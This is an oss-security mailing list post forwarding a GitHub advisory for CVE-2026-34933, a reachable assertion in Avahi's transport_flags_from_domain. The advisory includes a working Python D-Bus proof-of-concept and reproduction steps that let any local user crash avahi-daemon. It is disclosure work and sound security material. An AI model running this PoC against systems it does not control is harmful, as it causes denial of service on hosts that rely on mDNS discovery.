Received: (qmail 12139 invoked by uid 550); 11 Apr 2026 16:56:46 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 12117 invoked from network); 11 Apr 2026 16:56:45 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=oracle.com; h=
	content-transfer-encoding:content-type:date:from:message-id
	:mime-version:subject:to; s=corp-2025-04-25; bh=qMiaM7Fmoo8QddGH
	lLOjGluj3FLhxLxyXX5Fvtl82uw=; b=oGMcqazaP8s+VYDcOv8xgVE9TcADR2Kw
	VECUZsrpEg4/lsx1z94dW7xkB5blVGXHOiiTku62xdSmhdiYk5GbxHDrYLhZyDMa
	CaZWlcb2bKFiPvvkG64sjB/gpKrSbTJhkE7Rvn1NeSr7QUUKFFu3Ffsr9j+yfq+B
	4AUjLtHKwfJmytOvtkAg1Dbe6J89DEt3C7kUPtAJsQyKsI/OZuj4IMZH+JPXKKGh
	k6w2YdHydrfOEEBq4iSUu5kXYLCj112Y6Z/Jr7BDgORUe22fy54/VK/KXDelM82t
	O/vNnDQt4zdKL2AHIoc87T2G+uRT1zWhReLBPo0TasfFw8YOIXKZbA==
ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
 b=jCAEvH0B3emR1djsa+QR4vYPh7WVptyZHitt4HvsUWlQfMtE4h9QRPO6Uqa+WuiU6eBVVXNh20mzuiQRJn3KoDFP0lSVrGQzlnqyGJ+VkElxq8J4UFUD2GiyvRtz2fXOEcreDsyit+DwyjJ4clUNVS60BNvDD066gaM5DSM7ElSRf9xo6Es91Dnmjfk6PzqY+zcHCspfnRoEg5tycrLlVqDAx4iKg/BDwZqhAsFSqvWZJeVwxqOrfeEvwo0fQO9EKxawkC/o2mlF49XwUy+ybGufLIUUVt8KEpf/n3RI4rqMa2EJJHQIG8xwVMS7JbLA19+OLimY/HqIea7vIJtmOQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector10001;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=qMiaM7Fmoo8QddGHlLOjGluj3FLhxLxyXX5Fvtl82uw=;
 b=SOoOwUZSVAdMxQRcuCaPJKXVNR/9SYtlEkP60NZ/sajlfBAcuKrmdIBFxIBbXekzn1LniFSXopjCRvH1A8cgO/yhvhZwJ7UAn0TLLwA2Vg5aBpzbICko0aXpa/dQStSTpf3EjA6F3BCWOq7AF3tuFAQbcjWKnkxrxJ/gXi0AujpGAk1Kmh//KWIjc/9XNRSVpDyFpIKNneZx961S+FMh7C/rA9zC9I/Szf2d7EwKpioyifwG4fx2hN/yB3R8fia1/iNN3dhgSfILsgHg+uugB1Loy/zZsAEFPsIWI6tUKby1VjgSSmFhBs1rwi1D6VzgDMUqd7JmYipK5vKWy0OiDw==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=oracle.com; dmarc=pass action=none header.from=oracle.com;
 dkim=pass header.d=oracle.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=oracle.onmicrosoft.com; s=selector2-oracle-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=qMiaM7Fmoo8QddGHlLOjGluj3FLhxLxyXX5Fvtl82uw=;
 b=YDY3z7AYHcbtGLijrTLXV2PQ5/Hz3+FvyLQiaWSIVUL8eWczHPrX/+NtEV7GfeU9cBF4wyEH2H4vtudvlJYmmx2LHFwQmsVCDsQ/bQqzp8wIm2wXv05M/7tBlr8EMEDjUZoZNQI2bARJZm2qZE9NHmgWICrK5qGOHTQSx+aSRNs=
Message-ID: <36063a73-4e8a-4e9e-9385-39e908d539a0@oracle.com>
Date: Sat, 11 Apr 2026 09:56:29 -0700
User-Agent: Mozilla Thunderbird
Content-Language: en-US
From: Alan Coopersmith <alan.coopersmith@oracle.com>
To: oss-security@lists.openwall.com
Autocrypt: addr=alan.coopersmith@oracle.com; keydata=
 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
 5V9JclVH6u5Gug==
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 7bit
X-ClientProxiedBy: CH5P223CA0014.NAMP223.PROD.OUTLOOK.COM
 (2603:10b6:610:1f3::16) To CH3PR10MB6739.namprd10.prod.outlook.com
 (2603:10b6:610:147::6)
MIME-Version: 1.0
X-MS-PublicTrafficType: Email
X-MS-TrafficTypeDiagnostic: CH3PR10MB6739:EE_|DS0PR10MB6798:EE_
X-MS-Office365-Filtering-Correlation-Id: ab3902be-8107-4bd7-187c-08de97eb487f
X-MS-Exchange-SenderADCheck: 1
X-MS-Exchange-AntiSpam-Relay: 0
X-Microsoft-Antispam:
	BCL:0;ARA:13230040|366016|376014|1800799024|56012099003|18002099003;
X-Microsoft-Antispam-Message-Info:
	s2yfXsqNSh/2pLPNIIpwBSPTmht+ma8x099j+LVk0a4i6qqeGySS5zdNmmRhxj0U9mWZJiiRHM8UJgSZJeyH16fhDNCQIW2/OB1/Ymogh4BdTGryWUy3U6wHp2u7CywMBxmfWH0YNyq41f2D0uEhkuz3/FiPwr0Di1GDiA/X8tgFLv6DfV/mZhxjK6YR0j/Fmlj0glcww5BkZvbfWPj8T+zagtPrbPMwz4yD0rw2G74cewDIvUuS1xlwg7Vpl3qarf1ZboQhy72LP69S/3mjkNPpNEffEel1JoPGx7hRFWtHnQ7n7NYtIGxAsbUCe60eXSDJQ1+BrywIbqIi8SVPmxg5z3/e5YGemcLD7pRyzibXj0HPnE5jmJreP6JSSeeUd6COnelNHXSg7Mw6jn/qhLXJAV8gqbrbD2GO08J+C/UkJcMceWGW0XggGs8FTwfCJyFmtnSSD4AMYbScrJpbOmzjM1wayIPIQgcbO0pAbN0liIz/knjgPZIOhFsYjqvn8mE/5DiIEUPnv6zR5nk1xuIbVy1xzJvzHo06PP/FdqYflSnAN/J5AojzF2KT5HRmxRsgWqcpqilNXL2BJX5dl9BfTnO13JY6ZGmbMTjvLufib3xfBw2wOXqhTZ5IUyhJz4AVxZwElNt9TavAoEvLyim1flVosoyDTWyRTkam7Xz5Zy7oRWCfsQmJaaaQOr8ozFTnEOZhjf6GgDYSxik85ItMCVXhZskDZOwsphU6VkBz0suc4omS7IMMO4+9PBXh
X-Forefront-Antispam-Report:
	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:CH3PR10MB6739.namprd10.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(366016)(376014)(1800799024)(56012099003)(18002099003);DIR:OUT;SFP:1101;
X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-MessageData-0:
	=?utf-8?B?ekZXM0ZNYVJmMWpFcUZyZkZyMGdKMDlMbDZPSDdid0JrSHV0R0RmVlVlbXJC?=
 =?utf-8?B?cm1JTXFOTW1KaUxyZDM3L2F3ZkZSUDNweFhWR3NwcEVPTWlGQjM5MHZ3MVNI?=
 =?utf-8?B?WUhqRXl4ME12Q0tuVzNiSmptTTdnb1ZJeE15aEI1dks3cjlHcFB3R2ltd0h5?=
 =?utf-8?B?bVlRN3YzWE4rOGcxUmZEbmdMalVFK01MbHBaZ0pmUkc5cFljWmJDaVhOSk16?=
 =?utf-8?B?MzJhR2ZGRVlvOUZYZFBMWE00aG5BVTNxdTZvRGhkemY5NnhsVVBoWmhpRUxa?=
 =?utf-8?B?QU5IU04va09IVmFjVFc2c1hRSDZYL0x4VE9Fa1ZHQjBRN1RkNlZWV2owMmZE?=
 =?utf-8?B?VlYyak4xOWhyY2x6bXc5eWQwdFZnRWJMa0VKVUZCQlU2YzNsUkhBNUoyU1Rq?=
 =?utf-8?B?VEFmNFBmN3Vtc203THVHNjN1a0xCWlQ5TG5CSDQxV3JDSE9VSmdsaTFpakdW?=
 =?utf-8?B?OWJVSmZjOEpjaWRFdmg0TGw1M0lPOHNjN0dqOUZ0TG5CV3J0RGl0SWRyMGpP?=
 =?utf-8?B?RVdGelZIRFd5cUVrcTh5Mk1qa1FIalJ4Z0RtZWdKMzNDMHhHenNobWRGUVVS?=
 =?utf-8?B?bTBxb05tYStpU0dnQklKWkdTNHFidC9tRFJOSU9zS05PUW0xOFdFenhLNWtx?=
 =?utf-8?B?QWpjU0pOZENnWGVHbWhoMWZCYkp0bmlvRHI5alhjcUx5dHB3UFBtUVlPWXo4?=
 =?utf-8?B?aTRKbjVSZVhKdk95eGw3bk84OXozYmgwbkxFbkJ6WG9CSkl2Mm5KKzRUb1Vj?=
 =?utf-8?B?MmxmK1JadTJwelAvV2UxVVN5VjV4NEJFc3VtSGh5MFF3ekZQYkxQUlVWblBw?=
 =?utf-8?B?Y2gvaXZPZ0RveFBmWm85WTY2WVE2V1RTZXFPUFJoNm1OUlFScWpzWlNKYnRC?=
 =?utf-8?B?WG9RZ1ZnSFMvc294dUU2YVZxUnYvekdwSDFVRTRKRjdTeG40T1plbXZFdGNk?=
 =?utf-8?B?YmV2cnBSRzNCSFZjcWFMeUlBTjhZQnRRa2J4NVJIQzdTOXQyQ0Nad285UEds?=
 =?utf-8?B?eHhnd1Bkd25BYzVpVTB1ZXRPeU5Dbk9rS2UySXhJRjMwaVYvdDV4bytvNExW?=
 =?utf-8?B?cmFUS1pjTDdEY0tZMzhDUGVKWGlOUDRSQjNaV1VWWmZ1OU1vZjdMVkRvQUJl?=
 =?utf-8?B?K1RNNXpGVnB5WnM4Q2RIT3dHb2xzMlFVTFNyUWlXbmhhR3BqTXN5VlBqWHJt?=
 =?utf-8?B?bUZTTU5tRWxoNEp0ZzlJbWdXZWhTNVNYUngweWhKYldSK1RlLzJLcnIvWjlH?=
 =?utf-8?B?UU1GUUZkR3NmZzZqbTFOVlY5d3lCZDYxWmhOWHFjT210Kyt5SGwwNjVnVVdP?=
 =?utf-8?B?RWZXT2NMZWRBNkdvMTc3c2hvdndkbUZEaHpmekJJNFhJWEZhbS9Rc0F4MW03?=
 =?utf-8?B?cXU5SW5wa2ZNYm9Jd0pVQlZBOWxCR3pIUGw2bUxEUEQxd0k2bXdLZnJIWXpl?=
 =?utf-8?B?Vkt0UTQraU4ySklJam4rZHpWNUlFZDJQOS90TjVzelBVMWNRVGpIOS9TY3VG?=
 =?utf-8?B?VUVZVnkxR214K2N1MU43VWRxcXhHT21QVFdVKzZQdnpQc1ZjRnVwNXUvWi9X?=
 =?utf-8?B?bi8yZFNEdExxNExsYmYyRmNOSVJzcmxjNFdkZ1hXckJtVTNCWml0UFRJc2VI?=
 =?utf-8?B?M0JxbHozL214WlozMVdrRnB4RHFXelh1VlZjSTQ5T0xJK3V2Z2lDWnFNRnB6?=
 =?utf-8?B?T3hFVklzaHp6RWZ0QVFXYStpcTVPSnE4ZXBVNXN0RjRubzc4RVNuaUxyQzFT?=
 =?utf-8?B?VjJodmREcjMyMlNvY1pOOFdPWFRqVkNsSUoyK2c3Y0M1RmZXYjNHU1NOVllp?=
 =?utf-8?B?V3EwWnMxd1RKS1pBcmJUWVhBYTJtNDlocE92V0lVMVU1UEg0dDNuNFJZWDNs?=
 =?utf-8?B?MUtqRi9ZbUtxYjVSenBPUjZULzJUMGpEaVNSaVM2VmdPWlRrVXFoWlcwWEE2?=
 =?utf-8?B?VURxYXJaR0NHVVUramI3ZkxoUzFqZmYyYVNPMmxDNmkxcW1kUVVlVlJKRjRj?=
 =?utf-8?B?NndzcTJMZ25TYzJIWXJZYmUvQ1ZHY09hbnZHMmlQcWtLTUxVRUsyS0NNYVlG?=
 =?utf-8?B?eXRTQnZsS2llRkxqeWc0bUFXTUFVejNMNlFUSm5UZGxOb29aWWtnOTUxb1gv?=
 =?utf-8?B?YTRxdFJCTHd6ZWRLK0huQXFxRUU4dys2RlpDNVFiSGw3dFgrdjdBR1pEa24y?=
 =?utf-8?B?VWdrTWhRL2NVL1dKcXZKd0lqMXdHclJCSXlWNEhsVUhxdjBSc205S0VtQ3Ft?=
 =?utf-8?B?bFMyUFpmNE9tZVU1V3AxcEw3eUk0MXlWcGtWeDR1Vkljc1BJaHR4bjJNWHRi?=
 =?utf-8?B?VERLa09yUEllMGk3Q0JtcTA2aUpja3JoR0JRZllYSzNZbXVNSGdISFNURzRM?=
 =?utf-8?Q?CtNJwmtqvAOahmZo=3D?=
X-Exchange-RoutingPolicyChecked:
	nXkqNhBrnML0wZ70WPWUoAsU0Y4bW7UAaiIJ9j5LQh/cntrwPyaW6mWtsdcrwKBYrM887am0WEgKWpMjRV5zWdUHrm/e3+zcAl8ZLMsR6azsQJG2+4RbouNPUxPF65R9RF89Ku9cH1ljCMHF8QsPAi61runcx/0n/wpZf7XK4kL1HAQkc+ZkPm9F2b2QqiJusVB58m/U3ysrLgdAf4R7Nv8tH4I/zqnMM/iIvh5J5/7JswH64EcQcab2/WE7bmOibvIs0PhIVRU98C0fC/GgYf2feT98BnQkb1Dm3qCMDKnGB5sx0h0vTl2KiES+Ww0kQeCmCwrw8cEyMV4he4j6kQ==
X-MS-Exchange-AntiSpam-ExternalHop-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-ExternalHop-MessageData-0:
	7R1m9aPg6BHQcibGQ/onLQI8PJPRdaHfdOLgZ+6MMRSdtFV+fHEzw2WWYttcW4tP4gQNTBGS0qmKHFSnGzaHbbxFyKSCF/fab0vRR8Rz+ZzDrBexd3xu0FqZNfMXjTdhACyXitZWQVxMsq8eYE99t68ssvJ18H2XhSFRg9G5ZoyTiregEOegcxfXmqYsD5OSSGp7AY3o/v7aRbVlvpuzP2ADRbzj+ZoFXZuGsdNlpEQZ7RKVGKLTjyeGVkJ0/dL1QI64pSqht4Vlm3+vOcMqOmEN1BEpUjDjoajROLJ1zoFQBLenUioKbMgVaGKksWinpLHR5g4sAbJkcSeAPqEcuSbnlW/gAcM7RXGLVoKc8tP7hLz9WxiHg4HiJNbzBNyJGtSjZ2Q+Q72y2WmwIxA6XOrHk8Cl2bezvioerg/5XI/gk3VIxNr/2YYvlK6q65psri2Bt+poUWE/IfHYTr0fq0yqyJx095kqEspwc464Azjha8LrQSaVZJ/tCR9rCci+jrY32X0ZSYsReRV0cgxMh1p1V0RHfjUe7q87hCS1Q82Eiar3Bz1eY9f4FYCAEezwJP+YdFZN/nHFA1CUAuOHlmJ+ORbdt/oVYnvQrgFpZGQ=
X-OriginatorOrg: oracle.com
X-MS-Exchange-CrossTenant-Network-Message-Id: ab3902be-8107-4bd7-187c-08de97eb487f
X-MS-Exchange-CrossTenant-AuthSource: CH3PR10MB6739.namprd10.prod.outlook.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 11 Apr 2026 16:56:32.4321
 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: 4e2c6054-71cb-48f1-bd6c-3a9705aca71b
X-MS-Exchange-CrossTenant-MailboxType: HOSTED
X-MS-Exchange-CrossTenant-UserPrincipalName: pUUcNvEde8s+Sh49NfOiMU2U0R4leKqHj8Aiav5E1xa16ojrzGCLzyyB53XXjNJ0aN7bJXAtaYE7ddIaj1seWESRi+bR4Juj5FKc2L4jSJM=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: DS0PR10MB6798
X-Proofpoint-Virus-Version: vendor=baseguard
 engine=ICAP:2.0.293,Aquarius:18.0.1143,Hydra:6.1.51,FMLib:17.12.100.49
 definitions=2026-04-11_04,2026-04-09_02,2025-10-01_01
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 mlxlogscore=999 malwarescore=0
 bulkscore=0 adultscore=0 spamscore=0 phishscore=0 mlxscore=0
 suspectscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.12.0-2604010000 definitions=main-2604110148
X-Proofpoint-GUID: j75Nz1kWFRQekZqJ_hiZktK5wLL9OY76
X-Proofpoint-Spam-Details-Enc: AW1haW4tMjYwNDExMDE0OCBTYWx0ZWRfX4RRUVWPORzb3
 khO3XwqQmc4Q6YiUEtDcv8GfRtIVV35XUA3SsQwv/N2xK/9fOF88BdIFkzKLP2VWf9oR9Te6E+I
 f+lNQ9+I5ovsmrGHgz7hUEVkD67KhTFz8o5M9i/cARg0Mc/AP1XkSSbU61+Erk+qSeoSSs30VYU
 Bl0MrPbS2ztdrLYMZjsaYuMA1qjhVUh6yEmLSJ6CXha1VfxLXF0iHfDLhTPPd31BuvgIrm2IVVm
 4KMv5gP05msO9NUiOOewg+Y03GM+8qq76Zv0udd1NERqu+pc7ylaK8dcPupdp05bS4QQKwk9SwB
 Ry3//yqL/mEC602uzWwsBFotk95/4gNEDngZ4hUqH2NI6QGjlRk+N8AxuPAkDQ47WQ25RQ5G+34
 8UQujsnI47XldGIK/KIrH8XAvRbZ2GxoOajKePd2LH7SNU0dJQZ6NAyPPU2FZrFWeOBalDP5q3Q
 P1W7Z8uaA7BJME3LgPr2+S13jaKRmCsFEDmLpAcs=
X-Proofpoint-ORIG-GUID: j75Nz1kWFRQekZqJ_hiZktK5wLL9OY76
X-Authority-Analysis: v=2.4 cv=Yoc/gYYX c=1 sm=1 tr=0 ts=69da7d44 b=1 cx=c_pps
 a=qoll8+KPOyaMroiJ2sR5sw==:117 a=qoll8+KPOyaMroiJ2sR5sw==:17
 a=6eWqkTHjU83fiwn7nKZWdM+Sl24=:19 a=z/mQ4Ysz8XfWz/Q5cLBRGdckG28=:19
 a=lCpzRmAYbLLaTzLvsPZ7Mbvzbb8=:19 a=xqWC_Br6kY4A:10 a=IkcTkHD0fZMA:10
 a=A5OVakUREuEA:10 a=GoEa3M9JfhUA:10 a=VkNPw1HP01LnGYTKEx00:22
 a=jiCTI4zE5U7BLdzWsZGv:22 a=3I1J8UUJPc9JN9BFgKH3:22 a=NEAV23lmAAAA:8
 a=yPCof4ZbAAAA:8 a=AerbRGCz59uNOzacF64A:9 a=QEXdDO2ut3YA:10 cc=ntf
 awl=host:12292
Subject: [oss-security] Avahi: Reachable assertion in
 transport_flags_from_domain (CVE-2026-34933)

https://github.com/avahi/avahi/security/advisories/GHSA-w65r-6gxh-vhvc advises:
> Reachable assertion in transport_flags_from_domain (CVE-2026-34933)
> 
> Moderate
> evverx published GHSA-w65r-6gxh-vhvc Apr 1, 2026
> 
> Affected versions: <=v0.9-rc3
> Patched versions:    v0.9-rc4
> 
> Description
> -----------
> In all versions up to and including 0.8 and 0.9-rc3, any unprivileged local
> user can crash avahi-daemon by sending a single D-Bus method call with
> conflicting publish flags.
> 
> The AVAHI_PUBLISH_USE_MULTICAST (0x100) and AVAHI_PUBLISH_USE_WIDE_AREA (0x80)
> flags are individually accepted by the AVAHI_FLAGS_VALID() validation macro at
> entry.c:201-209 (for AddRecord) and entry.c:593-597 (for AddService), since
> both are listed in the allowed flags bitmask. However, these flags are mutually
> exclusive, and the function transport_flags_from_domain() at entry.c:57 enforces
> this exclusivity with an assert():
> 
> static void transport_flags_from_domain(AvahiServer *s, AvahiPublishFlags *flags, const char *domain) {
>     assert(flags);
>     assert(domain);
> 
>     assert(!((*flags & AVAHI_PUBLISH_USE_MULTICAST) && (*flags & AVAHI_PUBLISH_USE_WIDE_AREA)));
>     // ...
> }
> 
> When both flags are set simultaneously (flags = 0x180), the assertion fails,
> causing the daemon to abort with SIGABRT. The D-Bus system bus policy
> (avahi-dbus.conf) allows any local user to call EntryGroupNew and AddService
> without restrictions.
> 
> Root cause
> ----------
> The flags validation (AVAHI_FLAGS_VALID) and the mutual exclusivity check
> (assert in transport_flags_from_domain) are performed at different layers
> with no coordination:
> 
>  1. AVAHI_FLAGS_VALID(flags, mask) checks !(flags & ~mask) -- it verifies that
>     no unknown bits are set, but does not check for mutually exclusive
>     combinations.
>  2. transport_flags_from_domain() enforces mutual exclusivity via assert(),
>     which is a fatal operation in a production daemon.
> 
> Affected D-Bus methods
> ----------------------
> The following D-Bus methods on org.freedesktop.Avahi.EntryGroup accept a flags
> parameter that reaches the vulnerable function:
> 
> Method            D-Bus handler            Core function
> AddService        dbus-entry-group.c:166   server_add_service_strlst_nocopy()
>                                            -> transport_flags_from_domain()
> AddServiceSubtype dbus-entry-group.c:213   server_add_service_strlst_nocopy()
>                                            -> transport_flags_from_domain()
> AddAddress        dbus-entry-group.c:280   avahi_server_add_address()
>                                            -> transport_flags_from_domain()
> AddRecord         dbus-entry-group.c:311   avahi_server_add()
>                                            -> server_add_internal()
>                                            -> transport_flags_from_domain()
> UpdateServiceTxt  dbus-entry-group.c:370   server_update_service_txt_strlst_nocopy()
>                                            -> transport_flags_from_domain()
> 
> Proof of Concept
> ----------------
> 
> #!/usr/bin/env python3
> """Any local unprivileged user can crash avahi-daemon with this script."""
> import dbus
> 
> AVAHI_PUBLISH_USE_WIDE_AREA = 128   # 0x80
> AVAHI_PUBLISH_USE_MULTICAST = 256   # 0x100
> CONFLICTING_FLAGS = AVAHI_PUBLISH_USE_WIDE_AREA | AVAHI_PUBLISH_USE_MULTICAST
> 
> bus = dbus.SystemBus()
> server = dbus.Interface(
>     bus.get_object('org.freedesktop.Avahi', '/'),
>     'org.freedesktop.Avahi.Server'
> )
> 
> # Create an entry group
> eg_path = server.EntryGroupNew()
> eg = dbus.Interface(
>     bus.get_object('org.freedesktop.Avahi', eg_path),
>     'org.freedesktop.Avahi.EntryGroup'
> )
> 
> # Trigger the crash: AddService with both MULTICAST and WIDE_AREA flags
> eg.AddService(
>     dbus.Int32(-1),                    # interface (AVAHI_IF_UNSPEC)
>     dbus.Int32(-1),                    # protocol (AVAHI_PROTO_UNSPEC)
>     dbus.UInt32(CONFLICTING_FLAGS),    # flags = 0x180 (CRASH)
>     dbus.String("PoC-Service"),        # name
>     dbus.String("_http._tcp"),         # type
>     dbus.String(""),                   # domain
>     dbus.String(""),                   # host
>     dbus.UInt16(8080),                 # port
>     dbus.Array([], signature='ay')     # TXT records
> )
> 
> Reproduction
> ------------
> 
> # On any Linux system with avahi-daemon running:
> apt install python3-dbus    # if not already installed
> python3 poc.py
> 
> # Verify crash:
> systemctl status avahi-daemon
> # Expected: "avahi-daemon.service: Main process exited, code=exited, status=134/n/a"
> 
> journalctl -u avahi-daemon -n 5
> # Expected: "entry.c:57: transport_flags_from_domain: Assertion
> #   `!((*flags & AVAHI_PUBLISH_USE_MULTICAST) && (*flags & AVAHI_PUBLISH_USE_WIDE_AREA))' failed."
> 
> Impact
> ------
> 
>  * Any unprivileged local user can immediately crash the avahi-daemon process.
>  * All mDNS/DNS-SD services on the host become unavailable.
>  * Applications relying on nss-mdns for .local hostname resolution fail.
>  * Network service discovery (printers, Chromecast, AirPlay, etc.) stops.
>  * While systemd auto-restarts the daemon, repeated crashes cause a persistent
>    DoS.
> 
> Credit
> ------
> Discovered by Guillaume MEUNIER - Head of VOC France - Orange Cyberdefense on
> 2026-03-10.
> 
> Fix
> ---
> It was addressed in <https://github.com/avahi/avahi/pull/891>.
> 
> Severity: Moderate - 5.5 / 10
> CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H
> CVE ID: CVE-2026-34933
> Weakness: CWE-617


-- 
         -Alan Coopersmith-                 alan.coopersmith@oracle.com
          Oracle Solaris Engineering - https://blogs.oracle.com/solaris

